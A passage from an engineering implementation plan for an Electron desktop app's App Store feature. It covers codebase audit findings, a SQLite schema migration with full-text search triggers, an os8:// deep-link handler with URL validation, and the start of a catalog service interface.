# OS8 App Store — Phase 1 Implementation Plan

**Companions:** [`app-store-spec.md`](./app-store-spec.md) (Draft v2), [`app-store-plan.md`](./app-store-plan.md), [`phase-0-plan.md`](./phase-0-plan.md).
**Audience:** Engineers implementing PRs 1.1 – 1.29 in `/home/leo/Claude/os8/`.
**This document:** the concrete contract for each Phase 1 PR — files, line-number splice points, DDL, function signatures, JSON shapes, IPC channels, test fixtures. Reference the spec/plan for *why*; this file is *how*.

---

## 1. Scope and the 1.14 gate

28 active PRs (1.1 – 1.29; PR 1.27 was removed when subdomain mode was made the v1 default — see app-store-plan.md §10 decision 11 and spec §1 "Why subdomain mode"). Every external app is served at `<slug>.localhost:8888` — its own browser origin, with cookies / localStorage / IndexedDB / service-workers / permission grants isolated by the browser's same-origin policy. The OS8 main UI stays on bare `localhost:8888`. Path mode (`localhost:8888/<slug>/`) was rejected for sharing one origin across all installed apps and for taxing manifest authors with per-framework base-path config.

The gating decision is **PR 1.14** — a Vite-HMR-through-reverse-proxy smoke test. Until 1.14 passes locally on macOS + Linux, three downstream PRs do not merge: **1.15** (mount middleware), **1.16** (install pipeline glue), **1.19** (BrowserView launch path). Subdomain WebSocket proxying is well-trodden in production tools (StackBlitz, Coder, GitPod) so the risk is low — but the test gates downstream work to catch any subtle Vite config issue (`server.hmr.clientPort`, `allowedHosts`) before it propagates.

Phase 1A's vertical slice (§"Phase 1A acceptance" at the end) is the smallest set of PRs (13) that proves the architecture before the remaining 15 land.

---

## 2. Audit findings

Verified at audit time against the working tree of `/home/leo/Claude/os8/`. Plan §2 already flagged most of these; this section confirms or extends.

| Spec / plan claim | Code reality at audit | Implication |
|---|---|---|
| Catch-all at `src/server.js:682-740` | ✓ — `app.use('/:identifier', ...)` at line **682**, falls through via `return next()` at **694** when neither `getById` nor `getBySlug` matches. | Insertion point for `scopedApiMiddleware` + `ReverseProxyService.middleware()` is **between line 679** (Vite middleware mount) **and 682** (catch-all). With subdomain-only routing, external requests arrive on `<slug>.localhost:8888` and the catch-all (which only matches the bare `localhost:8888` host's `/:identifier` paths) doesn't see them — but the order still matters because `scopedApiMiddleware` and `ReverseProxyService.middleware()` need to be registered globally and dispatch on `Host` themselves. |
| Vite middleware at line ~669 | ✓ — `app.use(viteServer.middlewares)` at **line 669**. | New middlewares mount immediately after this line. |
| WebSocket upgrade attach point | ✓ — `server.listen(currentPort, () => { … })` callback at **lines 774-798**. `setupVoiceStream(server)`, `setupTTSStream(server)`, `setupCallStream(server)` each attach their own `server.on('upgrade')` listener internally. | `ReverseProxyService.attachUpgradeHandler(server)` mounts the same way at **line 798** (after `setupCallStream(server);`, before the `setTimeout` block at line 800). |
| `apps.app_type` extends to `'external'`; `apps.status` extends to `'uninstalled'` | ✓ — `src/db/schema.js:10-23` defines `apps` with `app_type TEXT DEFAULT 'regular'` (line 20) and `status TEXT DEFAULT 'active'` (line 14). **No CHECK constraints.** | Pure additive — `ALTER TABLE` plus new column inserts suffice. |
| `apps` table has columns `icon_image`, `icon_mode` | ✗ — these are **NOT** in `schema.js`; they are added at runtime via `ALTER TABLE` in **`src/db/seeds.js:265-266`** (idempotent, swallows "duplicate column" errors). | Migration 0.5.0 must use the same `try { ALTER … } catch { /^duplicate column/ }` pattern. PR 1.1's idempotency wrapper is mandatory. |
| `app_env_variables` is the per-app secrets surface | ✓ — `schema.js:36-42`: `(id, app_id, key, value)` with `UNIQUE(app_id, key)` and `ON DELETE CASCADE`. Plaintext value, no `description` column. | Matches plan PR 1.10. **Note:** spec mentions a `description` column passed to `EnvService.set` for per-app vars — the column does NOT exist. Either add it in migration 0.5.0 or store description elsewhere. **Decision:** add `description TEXT` column to `app_env_variables` in PR 1.1 (idempotent ALTER). |
| `src/services/preview.js` BrowserView config has zero security posture | ✓ — `preview.js:52-115`: only `nodeIntegration: false, contextIsolation: true, backgroundThrottling: false`. **No** `sandbox`, **no** `preload`, **no** `webSecurity` (defaults to true), **no** `will-navigate` listener, **no** `setWindowOpenHandler`, **no** `setPermissionRequestHandler`. | PR 1.19 must add a `create(appId, { external = false } = {})` overload — DO NOT modify the existing default config (native apps depend on its current behavior). |
| `EnvService` is global only | ✓ — `src/services/env.js` is **67 lines**. Methods: `getAll(db), get(db, key), set(db, key, value, description=null), delete(db, key), asObject(db), migrateEncryptedToPlaintext(db)`. **No** appId-aware variants. | PR 1.10 extends with optional `{appId, description}` opts — see that PR. |
| `SkillReviewService` rename | ✗ DEVIATION (matches plan §2) — `src/services/skill-review.js` is **521 lines** with a hardcoded skill-specific system prompt at lines **34-79** (calls out skills as the unit of review by name). Renaming would churn 5 callsites in `src/routes/skills.js` (lines 198, 209, 221, 232, 243, 256) plus internal references. | **Keep `skill-review.js` as-is.** Add new `src/services/app-review.js` and extract a thin shared LLM-call helper into `src/services/security-review-shared.js`. PR 1.6 ships both. |
| `SkillCatalogService` shape to mirror | ✓ — `src/services/skill-catalog.js`: `seedFromSnapshot(db)` (lines 23-81), `sync(db)` (88-204), `search(db, query, opts)` (211+), FTS rebuild via `INSERT INTO skill_catalog_fts(skill_catalog_fts) VALUES('rebuild')` at line **197**. | Direct template for PR 1.3's `AppCatalogService`. |
| `routes/skills.js` review/approve pattern | ✓ — `routes/skills.js:195-262`: `:id/review` (POST), `:id/review` (GET), `:id/approve` (POST), `:id/reject` (POST), `:id/deps-status` (GET), `:id/install-deps` (POST). | PR 1.5 + 1.6 + 1.16 mount their routes following this exact factory shape. |
| `main.js` has single-instance lock + protocol handler hooks | ✗ — `main.js:205-393` — `app.whenReady()` does dock icon (208), `initDatabase()` (214), `EnvService.migrateEncryptedToPlaintext()` (218), migrator (224-263), `TTSService.resolveActiveProvider` (272), mic permissions (278-312), `startServer` (315), WorkQueue init (322-333), JobScheduler (336-337), powerMonitor resume (340), callbacks (348-385), `createWindow` (386). **No** `requestSingleInstanceLock`, **no** `setAsDefaultProtocolClient`, **no** `open-url`/`second-instance` handlers. | PR 1.2 inserts at the **very top of the module** (before the `app.whenReady()` call): `setPath('userData', …)` + `requestSingleInstanceLock()` + `app.setAsDefaultProtocolClient('os8')` + `open-url`/`second-instance` listeners. |
| `requestSingleInstanceLock({ key })` is the API | ✗ DEVIATION (plan §2) — Electron 40's `app.requestSingleInstanceLock()` does **not** accept an argument. Spec §6.2.6 pseudocode is wrong. | Scope per `OS8_HOME` by setting `app.setPath('userData', dir)` BEFORE `requestSingleInstanceLock()`. Two parallel dev instances with different `OS8_HOME` get different `userData` dirs and therefore independent locks. PR 1.2 documents and implements. |
| Migration version `0.5.0-app-store.js` | ✓ — `package.json:3` reports `"version": "0.4.15"`. `src/migrations/` has 17 existing files; `0.2.10-template-resync.js` is the canonical pattern (`module.exports = { version, description, async up({db, logger}) }`). Migrator at `src/services/migrator.js` reads `settings.os8_version`, sorts by version, runs in order, halts cleanly on failure (writes `~/os8/logs/migration-failure-<ts>.log`). | Bump `package.json` to `0.5.0` in PR 1.1. Migrator picks the new file up automatically. |
| `apps_staging` directory exists in `OS8_DIR` | ✗ — `src/config.js` defines `OS8_DIR / CONFIG_DIR / APPS_DIR / BLOB_DIR / CORE_DIR / SKILLS_DIR / MODELS_DIR / AVATARS_DIR / ICONS_DIR`. **No `APPS_STAGING_DIR`.** `ensureDirectories()` (lines 18-29) creates the rest at startup. | PR 1.5 adds `APPS_STAGING_DIR = path.join(OS8_DIR, 'apps_staging')` to `config.js` exports and to `ensureDirectories()`. |
| `scheduleCatalogSync` lives at server.js:197-232 | ✓ — daily 4am sync for SkillCatalog. Invoked from server startup chain at **server.js:891** (after MCP catalog seed). | PR 1.3 mirrors the pattern: add `scheduleAppCatalogSync()` in server.js, invoke from the same startup block. |
| `package.json` has `http-proxy` / `tree-kill` / `js-yaml` | ✗ — none installed. Existing deps: `express ^5.2.1, ws ^8.19.0, chokidar ^3.6.0, multer ^2.0.2, sharp ^0.34.5, better-sqlite3 ^12.6.2, node-pty ^1.1.0, @anthropic-ai/sdk ^0.74.0`. Electron `^40.0.0`, Node `>=22.0.0`. | New deps land in their owning PRs: `http-proxy@^1.18` in PR 1.13, `tree-kill@^1.2.2` in PR 1.11, `js-yaml@^4.1` in PR 1.4. |
| `preload.js` `preview` namespace | ✓ — `preload.js:139-153` exposes `preview.{create, destroy, destroyAll, setUrl, getUrl, refresh, goBack, goForward, canGoBack, canGoForward, getNavState, setBounds, hide, hideAll}`. Channel: `preview:create` calls `previewService.create(appId)` with no flag. | PR 1.19 extends `create` to take `{ external?: boolean }` opts and adds a new `preview.createExternal(appId, slug)` to the preload (less ambiguous at call sites). |
| `renderer/apps.js` double-click flow at line 92-95 | ✓ — `apps.js:91-96`: `icon.addEventListener('dblclick', () => { const appId = icon.dataset.id; const app = getAppById(appId); if (app) callbacks.createAppTab(app); });`. | PR 1.19 modifies `createAppTab` (in `tabs.js`) to dispatch on `app.app_type === 'external'` rather than touching apps.js. |
| `renderer/tabs.js:327-360` (createAppTab body) | ✓ — `tabs.js:327-360`: builds tab object, `addTab`, `renderTabBar`, `switchToTab(tab.id)` (which internally calls `restoreTabState` which calls `ensurePreviewForApp` from `renderer/preview.js`). | PR 1.19 inserts the external-app branch in `createAppTab` before the `switchToTab` call: if `app.app_type === 'external'`, POST `/api/apps/:id/processes/start` first, await `{ url }`, then proceed. |

**Net assessment.** The spec is faithful to the code's grain; most PRs are pure addition. Three load-bearing integrations have no existing analogue: **(1)** reverse-proxy + WebSocket upgrade pass-through (no proxy library installed; the upgrade hookup pattern at server.js:778-798 is the splice point), **(2)** the hardened-BrowserView overload (preview.js currently has *zero* security posture), **(3)** the install-job state machine and atomic staging→apps move (the closest existing pattern is `AppBuilderService` for headless React-app builds, which orchestrates very different work).

---

## 3. How to read this document

- **Files** are listed as absolute paths under `/home/leo/Claude/os8/`. Line-number splice points are exact at audit time.
- **Inline samples** are illustrative; production code may diverge in minor ways (variable names, error wrapping). Anything *contractual* — DDL, regex, IPC channel names, capability resolution table — is meant to be implemented as written.
- **Cross-PR dependencies** are listed under "Depends on." The dependency graph (plan §8) is the source of truth for ordering.
- **PR 1.14 gate flag** appears explicitly on every PR it gates.
- **Don't re-litigate plan §10 decisions.** They are settled. If a sub-question is still genuinely open after spec / plan / phase-0-plan, it appears under "Open sub-questions" — otherwise nothing.

---

## PR 1.1 — Migration `0.5.0-app-store.js` + `package.json` version bump

**Goal.** Apply spec §6.1's schema changes in a single idempotent migration, bump `package.json` to `0.5.0` so the migrator picks it up, and create the `apps_staging/` directory under `OS8_DIR`.

### Files

- **Create:** `/home/leo/Claude/os8/src/migrations/0.5.0-app-store.js`
- **Modify:** `/home/leo/Claude/os8/package.json` — bump `"version": "0.4.15"` → `"version": "0.5.0"` at line 3
- **Modify:** `/home/leo/Claude/os8/src/config.js` — add `APPS_STAGING_DIR` constant + include in `ensureDirectories()` array at line 19

### Migration body shape

Mirror `src/migrations/0.2.10-template-resync.js` (87 lines). Use the same idempotency pattern as `src/db/seeds.js:265-266`: wrap each `ALTER TABLE` in `try/catch` filtering on `/duplicate column/i`. `CREATE TABLE / CREATE INDEX / CREATE VIRTUAL TABLE` use `IF NOT EXISTS`.

```js
// /home/leo/Claude/os8/src/migrations/0.5.0-app-store.js

const fs = require('fs');
const path = require('path');
const { OS8_DIR } = require('../config');

module.exports = {
  version: '0.5.0',
  description: 'App Store schema: extend apps; add app_catalog + app_install_jobs',

  async up({ db, logger }) {
    // ── 1. Extend apps table (idempotent ALTERs) ─────────────────────
    const appsCols = [
      'external_slug TEXT',
      'channel TEXT',
      'framework TEXT',
      'manifest_yaml TEXT',
      'manifest_sha TEXT',
      'catalog_commit_sha TEXT',
      'upstream_declared_ref TEXT',
      'upstream_resolved_commit TEXT',
      'user_branch TEXT',
      'dev_mode INTEGER DEFAULT 0',
      'auto_update INTEGER DEFAULT 0',
      'update_available INTEGER DEFAULT 0',
      'update_to_commit TEXT'
    ];
    for (const colDef of appsCols) {
      try { db.exec(`ALTER TABLE apps ADD COLUMN ${colDef}`); }
      catch (e) { if (!/duplicate column/i.test(e.message)) throw e; }
    }

    // Add description to app_env_variables (spec §6.11 / EnvService extension)
    try { db.exec('ALTER TABLE app_env_variables ADD COLUMN description TEXT'); }
    catch (e) { if (!/duplicate column/i.test(e.message)) throw e; }

    // ── 2. app_catalog (mirrors skill_catalog) ───────────────────────
    db.exec(`
      CREATE TABLE IF NOT EXISTS app_catalog (
        id                       TEXT PRIMARY KEY,
        slug                     TEXT NOT NULL UNIQUE,
        name                     TEXT NOT NULL,
        description              TEXT,
        publisher                TEXT,
        channel                  TEXT NOT NULL,
        category                 TEXT,
        icon_url                 TEXT,
        screenshots              TEXT,
        manifest_yaml            TEXT NOT NULL,
        manifest_sha             TEXT NOT NULL,
        catalog_commit_sha       TEXT NOT NULL,
        upstream_declared_ref    TEXT NOT NULL,
        upstream_resolved_commit TEXT NOT NULL,
        license                  TEXT,
        runtime_kind             TEXT,
        framework                TEXT,
        architectures            TEXT,
        risk_level               TEXT,
        install_count            INTEGER DEFAULT 0,
        rating                   REAL,
        synced_at                TEXT,
        deleted_at               TEXT
      );

      CREATE INDEX IF NOT EXISTS idx_apps_external_slug   ON apps(external_slug);
      CREATE INDEX IF NOT EXISTS idx_apps_app_type        ON apps(app_type);
      CREATE INDEX IF NOT EXISTS idx_app_catalog_channel  ON app_catalog(channel);
      CREATE INDEX IF NOT EXISTS idx_app_catalog_category ON app_catalog(category);
      CREATE INDEX IF NOT EXISTS idx_app_catalog_deleted  ON app_catalog(deleted_at);
    `);

    // ── 3. FTS5 + content-table triggers ─────────────────────────────
    try {
      db.exec(`
        CREATE VIRTUAL TABLE IF NOT EXISTS app_catalog_fts USING fts5(
          slug, name, description, publisher, category, framework,
          content='app_catalog',
          content_rowid='rowid'
        );
      `);
    } catch (e) {
      if (!/already exists/i.test(e.message)) throw e;
      logger.warn(`[0.5.0] app_catalog_fts: ${e.message}`);
    }

    // Triggers — mirror skill_catalog FTS pattern. SQLite doesn't support
    // CREATE TRIGGER IF NOT EXISTS via db.exec without recent versions; wrap.
    const triggers = [
      `CREATE TRIGGER IF NOT EXISTS app_catalog_ai AFTER INSERT ON app_catalog BEGIN
         INSERT INTO app_catalog_fts(rowid, slug, name, description, publisher, category, framework)
         VALUES (new.rowid, new.slug, new.name, new.description, new.publisher, new.category, new.framework);
       END`,
      `CREATE TRIGGER IF NOT EXISTS app_catalog_ad AFTER DELETE ON app_catalog BEGIN
         INSERT INTO app_catalog_fts(app_catalog_fts, rowid, slug, name, description, publisher, category, framework)
         VALUES ('delete', old.rowid, old.slug, old.name, old.description, old.publisher, old.category, old.framework);
       END`,
      `CREATE TRIGGER IF NOT EXISTS app_catalog_au AFTER UPDATE ON app_catalog BEGIN
         INSERT INTO app_catalog_fts(app_catalog_fts, rowid, slug, name, description, publisher, category, framework)
         VALUES ('delete', old.rowid, old.slug, old.name, old.description, old.publisher, old.category, old.framework);
         INSERT INTO app_catalog_fts(rowid, slug, name, description, publisher, category, framework)
         VALUES (new.rowid, new.slug, new.name, new.description, new.publisher, new.category, new.framework);
       END`
    ];
    for (const t of triggers) {
      try { db.exec(t); }
      catch (e) { if (!/already exists/i.test(e.message)) throw e; }
    }

    // ── 4. app_install_jobs (state machine) ─────────────────────────
    db.exec(`
      CREATE TABLE IF NOT EXISTS app_install_jobs (
        id                       TEXT PRIMARY KEY,
        app_id                   TEXT,
        external_slug            TEXT NOT NULL,
        upstream_resolved_commit TEXT NOT NULL,
        channel                  TEXT NOT NULL,
        status                   TEXT NOT NULL,
        staging_dir              TEXT,
        review_report            TEXT,
        error_message            TEXT,
        log_path                 TEXT,
        created_at               TEXT NOT NULL,
        updated_at               TEXT NOT NULL
      );

      CREATE INDEX IF NOT EXISTS idx_install_jobs_status ON app_install_jobs(status);
      CREATE INDEX IF NOT EXISTS idx_install_jobs_slug   ON app_install_jobs(external_slug);
    `);

    // ── 5. Ensure apps_staging directory exists ─────────────────────
    const stagingDir = path.join(OS8_DIR, 'apps_staging');
    if (!fs.existsSync(stagingDir)) {
      fs.mkdirSync(stagingDir, { recursive: true });
      logger.log(`[0.5.0] Created ${stagingDir}`);
    }

    logger.log('[0.5.0] App Store schema applied');
  }
};
```

**Why `review_report TEXT` inline (not `review_id` FK).** Plan §10 decision 3: store the structured report as JSON on `app_install_jobs.review_report` rather than maintaining a separate `reviews` table. Mirrors the existing `capabilities.review_report` pattern at `src/db/schema.js:533`. If review history becomes load-bearing in PR 1.25 (multi-review surfaced in update flow), promote to a dedicated table then — mechanical migration.

**Why FTS triggers spelled out.** SQLite's FTS5 content tables don't auto-sync without `INSERT … VALUES('rebuild')` or these triggers. SkillCatalogService rebuilds via `INSERT INTO skill_catalog_fts(skill_catalog_fts) VALUES('rebuild')` after each sync (skill-catalog.js:197) — that approach works for bulk sync but not for single-row CRUD. App Store does both (sync + manual install rows), so triggers are the cleaner approach.

### `src/config.js` change

```js
// Add to /home/leo/Claude/os8/src/config.js

const APPS_STAGING_DIR = path.join(OS8_DIR, 'apps_staging');

// In ensureDirectories array (currently line 19):
[OS8_DIR, CONFIG_DIR, APPS_DIR, BLOB_DIR, CORE_DIR, SKILLS_DIR, MODELS_DIR,
 AVATARS_DIR, ICONS_DIR, APPS_STAGING_DIR].forEach(...);

// In module.exports (currently line 31-43):
module.exports = { ..., APPS_STAGING_DIR };
```

### Tests

`/home/leo/Claude/os8/tests/migrations/0.5.0.test.js` (vitest). Builds a freshly-seeded 0.4.x DB via `initDatabase()`, sets `os8_version = '0.4.15'` in settings, runs the migrator, asserts:

| Assertion | How |
|---|---|
| All 13 new `apps` columns exist | `PRAGMA table_info(apps)` returns matching column names |
| `app_env_variables.description` exists | `PRAGMA table_info(app_env_variables)` |
| `app_catalog` table + 3 indexes exist | `SELECT name FROM sqlite_master WHERE type='index' AND tbl_name='app_catalog'` |
| `app_install_jobs` table + 2 indexes exist | same |
| `app_catalog_fts` virtual table + 3 triggers exist | `SELECT name FROM sqlite_master WHERE name LIKE 'app_catalog%'` |
| FTS triggers fire | Insert into `app_catalog`, `SELECT * FROM app_catalog_fts WHERE app_catalog_fts MATCH 'worldmonitor'` returns the row |
| Rerun is idempotent | Run migrator twice; second run logs "no migrations needed" without error |
| `apps_staging/` exists under `OS8_DIR` | `fs.existsSync(stagingDir)` |

### Acceptance criteria

- `OS8_HOME=/tmp/os8-test-0.5.0 npm start` against a freshly-seeded 0.4.15 DB upgrades cleanly to 0.5.0; `~/os8-test-0.5.0/config/os8.db` shows the new tables and columns.
- A second `npm start` logs `[migrator] os8_version 0.5.0 — no migrations to run` and does not error.
- Crashing the migration mid-flight (e.g. `throw new Error('boom')` inside the `for` loop) leaves `os8_version` at its prior value, writes `~/os8-test-0.5.0/logs/migration-failure-<ts>.log`, and shows the migration-failure dialog (existing `main.js:226-262` behavior).

### Cross-platform notes

None — pure SQLite + filesystem. SQLite's `IF NOT EXISTS` and column-existence guards work identically on macOS / Linux / Windows. Path concatenation already uses `path.join`.

### Spec deviations

- **Add `description` column to `app_env_variables`.** Spec §6.11 implies `EnvService.set(db, key, value, { appId, description })` writes to per-app rows; the existing table has no `description` column. Migration adds it. (Plan §2 didn't flag this — extension to plan's audit.)

### Depends on

None. Foundation PR.

### Open sub-questions

None.

---

## PR 1.2 — `os8://` protocol handler + per-`OS8_HOME` single-instance lock

**Goal.** Register `os8://` as the default scheme client; route `os8://install?slug=…&commit=…&channel=…&source=…` to a stub `handleProtocolUrl()` that validates the URL and (for now) logs the parsed payload. Single-instance lock scoped per `OS8_HOME` so dev instances coexist. Real install dispatch arrives in PR 1.18.

### Files

- **Modify:** `/home/leo/Claude/os8/main.js` — insert at the **top of the module**, before line 29 (`let mainWindow;`); also extend `app.whenReady()` startup to call `app.setAsDefaultProtocolClient('os8')`.
- **Create:** `/home/leo/Claude/os8/src/services/protocol-handler.js` — pure logic for parsing/validating `os8://` URLs and dispatching to a deferred handler.
- **Modify:** `/home/leo/Claude/os8/package.json` `build` config — add Windows protocol registration, Linux desktop file declaration.
- **Create:** `/home/leo/Claude/os8/build/linux/os8.desktop` — Linux MIME-type declaration for `.deb` postinst.

### `main.js` insertion (top of file, before `let mainWindow`)

```js
const path = require('path');
const os = require('os');

// Scope userData per OS8_HOME so two dev instances with different OS8_HOME
// values get independent single-instance locks. Electron 40's
// requestSingleInstanceLock() does NOT take an argument — the spec's
// {key} pseudocode is wrong. Userdata-dir scoping is the correct mechanism.
const userDataDir = path.join(
  process.env.OS8_HOME || path.join(os.homedir(), 'os8'),
  '.os8-electron-userdata'
);
app.setPath('userData', userDataDir);

const gotLock = app.requestSingleInstanceLock();
if (!gotLock) {
  app.quit();
  // The remaining instance forwards os8:// args via the 'second-instance' event.
  return;
}

const { handleProtocolUrl } = require('./src/services/protocol-handler');

// macOS: open-url fires when the running instance is asked to handle a deeplink.
app.on('open-url', (event, url) => {
  event.preventDefault();
  handleProtocolUrl(url, mainWindow);
});

// Windows / Linux: second-instance fires in the FIRST instance when a SECOND
// is launched. argv[] contains the original launch args of the second instance,
// including the os8:// URL.
app.on('second-instance', (_event, argv) => {
  const url = argv.find(a => typeof a === 'string' && a.startsWith('os8://'));
  if (url) handleProtocolUrl(url, mainWindow);
  if (mainWindow && !mainWindow.isDestroyed()) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
});
```

### `app.whenReady()` addition

Inside the existing `whenReady` block (around line 213, immediately after `db = initDatabase();`):

```js
app.setAsDefaultProtocolClient('os8');
```

(macOS only honors this once per build; Linux honors it via the `.desktop` MIME declaration; Windows writes registry entries via `electron-builder` config. See cross-platform notes.)

### `src/services/protocol-handler.js`

```js
// Pure-ish module — exports handleProtocolUrl + a parser. No Electron deps in
// the parser (testable in unit tests with mocked window arg).

const SLUG_RE    = /^[a-z][a-z0-9-]{1,39}$/;
const SHA_RE     = /^[0-9a-f]{40}$/;
const CHANNEL_RE = /^(verified|community|developer-import)$/;

function parseProtocolUrl(url) {
  let parsed;
  try { parsed = new URL(url); } catch { return { ok: false, error: 'invalid url' }; }
  if (parsed.protocol !== 'os8:') return { ok: false, error: 'wrong protocol' };
  if (parsed.host !== 'install' && parsed.pathname !== '//install' && parsed.pathname !== '/install') {
    // os8://install?…  — Node URL's host parsing of custom schemes is quirky.
    // Accept either form; reject anything other than /install for v1.
    if (parsed.host !== '' || !parsed.pathname.includes('install')) {
      return { ok: false, error: 'unsupported action' };
    }
  }
  const slug    = parsed.searchParams.get('slug');
  const commit  = parsed.searchParams.get('commit');
  const channel = parsed.searchParams.get('channel') || 'verified';
  const source  = parsed.searchParams.get('source')  || null;

  if (!slug || !SLUG_RE.test(slug))       return { ok: false, error: 'bad slug' };
  if (!commit || !SHA_RE.test(commit))    return { ok: false, error: 'bad commit' };
  if (!CHANNEL_RE.test(channel))          return { ok: false, error: 'bad channel' };

  return { ok: true, action: 'install', slug, commit, channel, source };
}

function handleProtocolUrl(url, mainWindow) {
  const parsed = parseProtocolUrl(url);
  if (!parsed.ok) {
    console.warn('[protocol] rejected:', url, '—', parsed.error);
    return;
  }
  console.log('[protocol] install request:', parsed);
  // PR 1.18 replaces this with: send IPC to renderer to open install plan UI.
  // For 1.2, log + focus window.
  if (mainWindow && !mainWindow.isDestroyed()) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
}

module.exports = { parseProtocolUrl, handleProtocolUrl };
```

### Cross-platform integration

**macOS.** `app.setAsDefaultProtocolClient('os8')` works at runtime once. The OS prompts the user the first time an `os8://` URL is clicked. `open-url` event handles in-process delivery. No installer hook needed.

**Windows.** `setAsDefaultProtocolClient` writes `HKEY_CURRENT_USER\Software\Classes\os8\…` registry keys at first run. For installer-time registration, extend `package.json` `build` config:

```json
"win": {
  "target": "nsis",
  "icon": "build/icon.png",
  "protocols": [{ "name": "OS8", "schemes": ["os8"] }]
}
```

The `second-instance` handler reads `argv[]` for the URL.

**Linux.** Two install paths.

- **`.deb`** (apt-installable): Add `build/linux/os8.desktop`:

  ```ini
  [Desktop Entry]
  Name=OS8
  Exec=/opt/OS8/os8 %u
  Type=Application
  Icon=os8
  Categories=Development;
  MimeType=x-scheme-handler/os8;
  ```

  Then in `package.json`:

  ```json
  "deb": {
    "depends": ["nodejs", "npm"],
    "afterInstall": "build/linux/postinst.sh"
  }
  ```

  `build/linux/postinst.sh`:

  ```sh
  #!/bin/sh
  cp /opt/OS8/resources/build/linux/os8.desktop /usr/share/applications/
  update-desktop-database -q
  ```

- **AppImage:** No system integration on extract. On first run, prompt the user "Register OS8 to handle os8:// links?" via `dialog.showMessageBox`. On accept: write `~/.local/share/applications/os8.desktop` + invoke `xdg-mime default os8.desktop x-scheme-handler/os8`. On decline, store `protocolHandlerSetup = 'declined'` in settings; expose a re-trigger in Settings → Integrations.

  AppImage detection in `main.js` already exists at line 10 (`if (process.env.APPIMAGE)` enables the no-sandbox switch). Reuse the same env var for the first-run dialog.

  **Fallback for unregistered installs.** os8.ai's PR 0.11 ships an "OS8 not opening?" disclosure with a copyable commit. Users who skip the AppImage prompt — or whose distro mishandles `xdg-mime` — paste the commit into OS8's catalog browser (in-OS8 install path arrives in a future PR; not Phase 1A).

### Tests

`/home/leo/Claude/os8/tests/protocol-handler.test.js` — unit tests on `parseProtocolUrl` only.

| Input | Expected |
|---|---|
| `os8://install?slug=worldmonitor&commit=e51058e1765ef2f0c83ccb1d08d984bc59d23f10&channel=verified&source=os8.ai` | `{ ok: true, action: 'install', slug, commit, channel: 'verified', source: 'os8.ai' }` |
| `os8://install?slug=worldmonitor&commit=…&channel=verified` (no source) | `{ ok: true, source: null }` |
| `os8://install?slug=worldmonitor&commit=v1.4.2&channel=verified` | `{ ok: false, error: 'bad commit' }` (tag, not 40-char SHA) |
| `os8://install?slug=Bad-Slug&commit=…` | `{ ok: false, error: 'bad slug' }` (uppercase) |
| `os8://install?slug=worldmonitor&commit=…&channel=community` | `{ ok: true, channel: 'community' }` |
| `os8://uninstall?slug=worldmonitor` | `{ ok: false, error: 'unsupported action' }` |
| `https://os8.ai/apps` | `{ ok: false, error: 'wrong protocol' }` |
| `not a url at all` | `{ ok: false, error: 'invalid url' }` |

Manual cross-platform smoke (not a unit test):

- macOS: `open 'os8://install?slug=worldmonitor&commit=e51058e1765ef2f0c83ccb1d08d984bc59d23f10&channel=verified'` while OS8 is running → `[protocol] install request: …` log; window focuses.
- Linux (.deb install): `xdg-open 'os8://install?…'` → same.
- Linux (AppImage, after accepting first-run prompt): same.
- Windows: paste deeplink in browser → "Open OS8" prompt → log appears.

### Acceptance criteria

- Two parallel `OS8_HOME=~/os8-dev npm start` and `OS8_HOME=~/os8 npm start` invocations both run (different userData dirs → different locks).
- Two parallel `OS8_HOME=~/os8 npm start` invocations: the second exits cleanly with `app.quit()`.
- `parseProtocolUrl` test suite passes.
- Manual cross-platform smoke passes on at least macOS + Linux (.deb).

### Cross-platform notes

See "Cross-platform integration" above. Windows AppImage equivalent (portable) doesn't exist; .deb and AppImage cover Linux.

### Spec deviations

- `requestSingleInstanceLock({ key })` (spec §6.2.6) does not exist in Electron 40. Replaced with `app.setPath('userData', dir)` BEFORE `requestSingleInstanceLock()` (no arg). Documented inline.
- Linux integration tiered between `.deb` (postinst auto) and AppImage (first-run prompt) rather than a single mechanism — required because the formats have different install lifecycles. Plan §2 / §10 decision 4 already covers.

### Depends on

None. Independent of all other PRs (the install dispatch hook in PR 1.18 replaces the log call).

### Open sub-questions

None.

---

## PR 1.3 — `AppCatalogService` (sync + search + get)

**Goal.** Mirror `SkillCatalogService` shape. Sync from `https://os8.ai/api/apps?channel=verified` (PR 0.9 endpoint) into local `app_catalog`. Provide `search` (FTS5 + LIKE fallback), `get(slug)` (with parsed `manifestYaml`), `fetchManifest(slug, channel)` (single-row re-fetch from `/api/apps/[slug]` per PR 0.10).

### Files

- **Create:** `/home/leo/Claude/os8/src/services/app-catalog.js`
- **Create:** `/home/leo/Claude/os8/src/data/app-catalog-snapshot.json` — bundled seed for first boot (mirrors `src/data/skill-catalog-snapshot.json`); empty array `[]` is fine for v1, kept so `seedFromSnapshot` is callable
- **Modify:** `/home/leo/Claude/os8/src/server.js` — add `scheduleAppCatalogSync()` (mirror `scheduleCatalogSync` at lines 197-232) and call from the startup chain at **line 891** (alongside the existing skill catalog sync)
- **Modify:** `/home/leo/Claude/os8/src/services/index.js` — export `AppCatalogService`

### Service shape

```js
// /home/leo/Claude/os8/src/services/app-catalog.js
const AppCatalogService = {
  // First-boot bootstrap. No-op when table has rows.
  seedFromSnapshot(db) { /* returns int count */ },

  // Pull from os8.ai → upsert into app_catalog. Returns { synced, added, updated, removed, alarms }.
  async sync(db, { channel = 'verified', force = false } = {}) { /* … */ },

  // FTS5 + LIKE fallback. Filters on channel, category, framework. Limit default 50.
  search(db, query, { channel, category, framework, limit = 50 } = {}) { /* AppCatalogEntry[] */ },

  // Returns one row + parsed manifestYaml. Falls through to fetchManifest if missing.
  async get(db, slug, { channel = 'verified' } = {}) { /* AppCatalogEntry|null */ },

  // Re-fetch single manifest from os8.ai (used when local mirror is stale or sparse).
  async fetchManifest(slug, channel = 'verified') { /* AppCatalogEntry */ },
};
module.exports = AppCatalogService;
```

### `AppCatalogEntry` shape

```ts
type AppCatalogEntry = {
  id: string;                           // UUID; PK
  slug: string;
  name: string;
  description: string;
  publisher: string;
  channel: 'verified' | 'community';
  category: string;
  iconUrl: string | null;
  screenshots: string[];                // parsed from JSON array column
  manifestYaml: string;                 // raw YAML
  manifest: object;                     // js-yaml.load(manifestYaml) — only set in get/fetchManifest
  manifestSha: string;
  catalogCommitSha: string;
  upstreamDeclaredRef: string;
  upstreamResolvedCommit: string;
  license: string;
  runtimeKind: string;
  framework: string | null;
  architectures: string[];              // parsed JSON
